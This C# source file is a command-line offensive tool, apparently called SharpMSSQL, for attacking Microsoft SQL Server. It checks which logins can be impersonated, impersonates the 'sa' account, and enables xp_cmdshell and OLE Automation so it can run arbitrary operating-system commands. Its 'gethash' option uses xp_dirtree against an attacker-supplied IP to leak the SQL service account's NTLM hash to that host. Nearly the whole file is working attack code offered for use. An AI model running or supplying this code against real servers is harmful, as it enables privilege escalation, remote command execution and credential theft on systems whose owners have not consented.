using System;
using System.Data.SqlClient;
using System.Runtime.Remoting.Messaging;

namespace SQL
{
    class Program
    {
        static void ole_cmd(SqlConnection con, string cmd)
        {

            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";


            SqlCommand command = new SqlCommand(enable_ole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            reader.Close();
            
        }

        static void xp_cmdshell(SqlConnection con, string cmd)
        {

            String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
            String execCmd = $"EXEC xp_cmdshell '{cmd}'";


            SqlCommand command = new SqlCommand(enable_xpcmd, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();

            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();
            Console.WriteLine("Result of command is: ");
            while (reader.Read())
            {
                Console.WriteLine(reader[0]);
            }

            reader.Close();
            

        }


        static bool impersonation(SqlConnection con)
        {
            String executeas = "EXECUTE AS LOGIN = 'sa';";
        
            SqlCommand command = new SqlCommand(executeas, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
            // Check Who is logged in
            String querylogin = "SELECT SYSTEM_USER;";
            command = new SqlCommand(querylogin, con);
            reader = command.ExecuteReader();
            reader.Read();
            if (reader[0].ToString().Contains("sa"))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("Logged in as: " + reader[0]);
                Console.ResetColor();
                reader.Close();
                return true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Logged in as: " + reader[0]);
                Console.ResetColor();
                reader.Close();
                return false;
            }

            
 
        }

        static bool check_imperonated_logins(SqlConnection con)
        {
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            if (reader.HasRows){
                while (reader.Read() == true){
                Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                }
                reader.Close();
                return true;
            }
            else
            {
                Console.WriteLine("No accounts can be impersonated");
                reader.Close();
                return false;
            }
        }

        // Check role assignment
        static void check_role(SqlConnection con, string roleName)
        {
            
            String querypublicrole = $"SELECT IS_SRVROLEMEMBER('{roleName}');";
            SqlCommand command = new SqlCommand(querypublicrole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"User is a member of {roleName} role");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"User is NOT a member of {roleName} role");
                Console.ResetColor();
            }
            reader.Close();
        }

        // Check basic info
        static void enum_current_user(SqlConnection con)
        {
            // Check Who is logged in
            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            check_role(con, "public");
            check_role(con, "sysadmin");
            if (check_imperonated_logins(con))
            {
                Console.WriteLine("Some logins to impersonate found ... trying to impersonate sa ... ");
                impersonation(con);
            }
            
 
        }

        // Send nt hash of sql service to given IP address
        static void get_svchash(SqlConnection con, string srvIP)
        {
            String query = $"EXEC master..xp_dirtree \"\\\\{srvIP}\\\\test\";";
            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Close();
        }



        static void DisplayUsage()
        {
            Console.WriteLine("Usage: SharpMSSQL <sqlServer> <dbName> <operation> <hashServer>");
            Console.WriteLine("Arguments:");
            Console.WriteLine("  <sqlServer>    SQL Server name (required)");
            Console.WriteLine("  <dbName>       Database name (required)");
            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'cmd'");
            Console.WriteLine("  gethash <hashServer>   Server to send svc hash (probably your Kali Linux'");
            Console.WriteLine("  cmd <command>   Command to be executed using xp_cmdshell or OLE");
        }


        static void Main(string[] args)
        {
            if (args.Length < 3)
            {
                DisplayUsage();
                return;
            }

            string sqlServer = args[0];
            string database = args[1];
            string operation = args[2];


            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            switch (operation.ToLower())
            {
                case "enum":
                    enum_current_user(con);
                    con.Close();
                    break;
                case "gethash":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'gethash' operation, provide a IP address to send hash.");
                        DisplayUsage();
                        return;
                    }
                    get_svchash(con, args[3]);
                    con.Close();
                    break;
                case "cmd":
                    if (args.Length < 4)
                    {
                        Console.WriteLine("Error: Missing argument. For 'cmd' operation, provide a command to execute.");
                        DisplayUsage();
                        return;
                    }
                    if (impersonation(con))
                    {
                        Console.WriteLine("Trying to execute command with xp_cmdshell ...");
                        xp_cmdshell(con, args[3]);
                        Console.WriteLine("Trying to execute command with OLE ... ");
                        ole_cmd(con, args[3]);
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Unfortunately you cant impersonate sa.");
                        Console.ResetColor();
                    }
                    
                    con.Close();
                    break;

                default:
                    Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'cmd'");
                    DisplayUsage();
                    break;
            }





            con.Close();
        }
    }
}